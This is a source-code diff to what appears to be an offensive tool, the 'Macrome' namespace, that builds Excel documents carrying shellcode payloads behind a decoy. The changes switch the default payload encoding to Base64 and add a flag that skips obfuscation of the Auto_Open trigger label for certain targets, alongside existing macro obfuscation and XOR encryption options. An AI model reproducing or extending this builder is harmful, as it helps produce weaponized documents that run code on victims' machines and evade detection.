@@ -183,15 +183,16 @@ namespace Macrome
         /// <param name="macroSheetName">The name that should be used for the macro sheet. Defaults to Sheet2</param>
         /// <param name="outputFileName">The output filename used for the generated document. Defaults to output.xls</param>
         /// <param name="debugMode">Set this to true to make the program wait for a debugger to attach. Defaults to false</param>
-        /// <param name="payloadMethod">How should shellcode be written in the document. Defaults to using the SheetPackingMethod for encoding.</param>
+        /// <param name="payloadMethod">How should shellcode be written in the document. Defaults to using the Base64 for encoding.</param>
         /// <param name="password">Password to encrypt document using XOR Obfuscation.</param>
         /// <param name="method">Which method to use for obfuscating macros. Defaults to ObfuscatedCharFunc. </param>
         /// <param name="localizedLabel">Use this flag in order to set a localized label in case Excel is not in US language. Default to Auto_Open</param>
+        /// <param name="noLabelObfuscation">Use this flag to disable Unicode obfuscation of the Auto_Open label. Recommended for when targeting a non-windows OS, or if a non-US version of Excel isn't triggering the event</param>
         public static void Build(FileInfo decoyDocument, FileInfo payload, FileInfo payload64Bit, string preamble,
             PayloadType payloadType = PayloadType.Shellcode, 
             string macroSheetName = "Sheet2", string outputFileName = "output.xls", bool debugMode = false,
-            SheetPackingMethod method = SheetPackingMethod.ObfuscatedCharFunc, PayloadPackingMethod payloadMethod = PayloadPackingMethod.MatchSheetPackingMethod, 
-            string password = "", string localizedLabel = "Auto_Open")
+            SheetPackingMethod method = SheetPackingMethod.ObfuscatedCharFunc, PayloadPackingMethod payloadMethod = PayloadPackingMethod.Base64, 
+            string password = "", string localizedLabel = "Auto_Open", bool noLabelObfuscation = false)
         {
             if (decoyDocument == null || payload == null)
             {
@@ -391,7 +392,10 @@ namespace Macrome
 
             wbe.AddLabel(localizedLabel, rwStart, colStart);
 
-            wbe.ObfuscateAutoOpen(localizedLabel);
+            if (!noLabelObfuscation)
+            {
+                wbe.ObfuscateAutoOpen(localizedLabel);
+            }
 
             WorkbookStream createdWorkbook = wbe.WbStream;
 
@@ -400,7 +404,6 @@ namespace Macrome
                 Console.WriteLine("Encrypting Document with Password " + password);
                 XorObfuscation xorObfuscation = new XorObfuscation();
                 createdWorkbook = xorObfuscation.EncryptWorkbookStream(createdWorkbook, password);
-                // createdWorkbook = createdWorkbook.FixBoundSheetOffsets();
             }
 
             ExcelDocWriter writer = new ExcelDocWriter();
